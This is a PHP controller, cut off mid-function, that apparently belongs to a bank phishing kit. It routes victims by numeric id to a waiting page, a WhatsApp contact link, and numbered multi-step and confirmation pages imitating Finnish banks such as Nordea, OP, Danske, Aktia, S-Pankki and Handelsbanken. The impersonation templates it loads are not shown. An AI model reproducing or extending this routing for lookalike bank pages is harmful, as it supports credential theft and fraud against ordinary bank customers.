<?php

namespace App\Controllers;

use App\Core\Controller;
use App\Models\User;
use App\Models\Bank;

class UserPageController extends Controller
{
    public function waiting(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $phone = preg_replace('/[^0-9]/', '', $user['phone']);
        $whatsappUrl = "https://wa.me/{$phone}";
        $message = "Merhaba " . htmlspecialchars($user['full_name']) . "!";
        $whatsappUrl .= "?text=" . urlencode($message);

        $this->view('user/waiting', [
            'user' => $user,
            'whatsappUrl' => $whatsappUrl,
            'phone' => $phone
        ]);
    }

    public function whatsapp(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $phone = preg_replace('/[^0-9]/', '', $user['phone']);
        $whatsappUrl = "https://wa.me/{$phone}";
        $message = "Merhaba " . htmlspecialchars($user['full_name']) . "!";
        $whatsappUrl .= "?text=" . urlencode($message);

        $this->view('user/whatsapp', [
            'user' => $user,
            'whatsappUrl' => $whatsappUrl,
            'phone' => $phone
        ]);
    }

    public function bank(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        $bankId = (int) ($params['bank_id'] ?? 0);
        
        if ($userId <= 0 || $bankId <= 0) {
            http_response_code(404);
            die("Kullanıcı veya banka bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $bankModel = new Bank();
        $bank = $bankModel->findById($bankId);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankSlug = $this->slugify($bank['name']);
        $viewFile = 'bank/' . $bankSlug;
        $viewPath = __DIR__ . '/../Views/' . $viewFile . '.php';

        if (!file_exists($viewPath)) {
            if ($bankId == 1) {
                $viewFile = 'bank/nordea';
            } elseif ($bankId == 2) {
                $viewFile = 'bank/alandsbanken';
            } elseif ($bankId == 3) {
                $viewFile = 'bank/danske';
            } elseif ($bankId == 4 || $bankId == 5) {
                $viewFile = 'bank/s-pankkibank';
            } elseif ($bankId == 10 || stripos($bank['name'], 'handelsbanken') !== false) {
                $viewFile = 'bank/handelsbanken';
            } elseif ($bankId == 8 || stripos($bank['name'], 'omasp') !== false || stripos($bank['name'], 'oma säästöpankki') !== false) {
                // OmaSP mutlaka Saastopankki'den önce kontrol edilməli ki, "Oma Säästöpankki" yanlışlıqla Säästöpankki kimi tutulmasın
                $viewFile = 'bank/omasp';
            } elseif ($bankId == 9 || stripos($bank['name'], 'säästöpankki') !== false || stripos($bank['name'], 'saastopankki') !== false) {
                $viewFile = 'bank/saastopankki';
            } elseif ($bankId == 7 || stripos($bank['name'], 'pop') !== false || stripos($bank['name'], 'poppankki') !== false) {
                $viewFile = 'bank/poppankki';
            } elseif (stripos($bank['name'], 'aktia') !== false) {
                $viewFile = 'bank/aktia';
            } elseif (stripos($bank['name'], 'op') !== false && stripos($bank['name'], 'pop') === false) {
                $viewFile = 'bank/opbank';
            } else {
                http_response_code(404);
                die("Banka sayfası bulunamadı: " . $bank['name'] . " (Slug: " . $bankSlug . ")");
            }
        }

        $this->view($viewFile, [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function nordea2(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(1);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: Nordea (ID: 1)");
        }

        $viewPath = __DIR__ . '/../Views/bank/nordea2.php';
        if (!file_exists($viewPath)) {
            http_response_code(404);
            die("View dosyası bulunamadı: bank/nordea2.php");
        }

        $this->view('bank/nordea2', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function nordea3(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(1);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/nordea3', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function nordea4(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(1);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/nordea4', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function nordea5(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(1);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/nordea5', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function alandsbanken2(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(2);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: Ålandsbanken (ID: 2)");
        }

        $this->view('bank/alandsbanken2', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function alandsbanken3(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(2);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/alandsbanken3', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function alandsbanken4(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(2);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/alandsbanken4', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function alandsbanken5(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(2);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/alandsbanken5', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function danske2(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(3);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: Danske Bank (ID: 3)");
        }

        $this->view('bank/danske2', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function spankki2(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(4);
        if (!$bank) {
            $bank = $bankModel->findById(5);
        }

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: S-Pankki");
        }

        $this->view('bank/s-pankkibank2', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function aktia2(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $allBanks = $bankModel->getAll();
        $bank = null;
        foreach ($allBanks as $b) {
            if (stripos($b['name'], 'aktia') !== false) {
                $bank = $b;
                break;
            }
        }
        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: Aktia");
        }

        $this->view('bank/aktiabank2', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function aktia3(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $allBanks = $bankModel->getAll();
        $bank = null;
        foreach ($allBanks as $b) {
            if (stripos($b['name'], 'aktia') !== false) {
                $bank = $b;
                break;
            }
        }
        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: Aktia");
        }

        $this->view('bank/aktia3', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function aktia4(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $allBanks = $bankModel->getAll();
        $bank = null;
        foreach ($allBanks as $b) {
            if (stripos($b['name'], 'aktia') !== false) {
                $bank = $b;
                break;
            }
        }
        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: Aktia");
        }

        $this->view('bank/aktia4', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function aktia5(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $allBanks = $bankModel->getAll();
        $bank = null;
        foreach ($allBanks as $b) {
            if (stripos($b['name'], 'aktia') !== false) {
                $bank = $b;
                break;
            }
        }
        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: Aktia");
        }

        $this->view('bank/aktia5', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function op2(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $allBanks = $bankModel->getAll();
        $bank = null;
        foreach ($allBanks as $b) {
            if (stripos($b['name'], 'op') !== false) {
                $bank = $b;
                break;
            }
        }
        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: OP");
        }

        $this->view('bank/opbank2', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function op3(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $allBanks = $bankModel->getAll();
        $bank = null;
        foreach ($allBanks as $b) {
            if (stripos($b['name'], 'op') !== false) {
                $bank = $b;
                break;
            }
        }
        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: OP");
        }

        $this->view('bank/opbank3', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function op4(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $allBanks = $bankModel->getAll();
        $bank = null;
        foreach ($allBanks as $b) {
            if (stripos($b['name'], 'op') !== false) {
                $bank = $b;
                break;
            }
        }
        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: OP");
        }

        $this->view('bank/opbank4', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function op5(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $allBanks = $bankModel->getAll();
        $bank = null;
        foreach ($allBanks as $b) {
            if (stripos($b['name'], 'op') !== false) {
                $bank = $b;
                break;
            }
        }
        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: OP");
        }

        $this->view('bank/opbank5', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function opConfirm(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $allBanks = $bankModel->getAll();
        $bank = null;
        foreach ($allBanks as $b) {
            if (stripos($b['name'], 'op') !== false) {
                $bank = $b;
                break;
            }
        }
        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: OP");
        }

        $this->view('bank/opbank-confirm', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function spankki3(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(4);
        if (!$bank) {
            $bank = $bankModel->findById(5);
        }

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: S-Pankki");
        }

        $this->view('bank/s-pankkibank3', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function spankki4(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(4);
        if (!$bank) {
            $bank = $bankModel->findById(5);
        }

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: S-Pankki");
        }

        $this->view('bank/s-pankkibank4', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function spankki5(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(4);
        if (!$bank) {
            $bank = $bankModel->findById(5);
        }

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: S-Pankki");
        }

        $this->view('bank/s-pankkibank5', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function spankkiConfirm(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(4);
        if (!$bank) {
            $bank = $bankModel->findById(5);
        }

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: S-Pankki");
        }

        $this->view('bank/spankki-confirm', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function danske3(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(3);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: Danske Bank (ID: 3)");
        }

        $this->view('bank/danske3', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function danske4(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(3);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: Danske Bank (ID: 3)");
        }

        $this->view('bank/danske4', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function danske5(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById(3);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı: Danske Bank (ID: 3)");
        }

        $this->view('bank/danske5', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function poppankki2(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/poppankki2', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function poppankki3(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/poppankki3', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function poppankki4(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/poppankki4', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function poppankki5(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/poppankki5', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function omasp2(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/omasp2', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function omasp3(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/omasp3', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function omasp4(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/omasp4', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function omasp5(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/omasp5', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function saastopankki2(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/saastopankki2', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function saastopankki3(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/saastopankki3', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function saastopankki4(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/saastopankki4', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function saastopankki5(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
            http_response_code(404);
            die("Banka bulunamadı");
        }

        $this->view('bank/saastopankki5', [
            'user' => $user,
            'bank' => $bank
        ]);
    }

    public function handelsbanken2(array $params = []): void
    {
        $userId = (int) ($params['id'] ?? 0);
        
        if ($userId <= 0) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $userModel = new User();
        $user = $userModel->findById($userId);

        if (!$user) {
            http_response_code(404);
            die("Kullanıcı bulunamadı");
        }

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_name'] = $user['full_name'];

        $bankModel = new Bank();
        $bank = $bankModel->findById($user['selected_bank_id'] ?? 0);

        if (!$bank) {
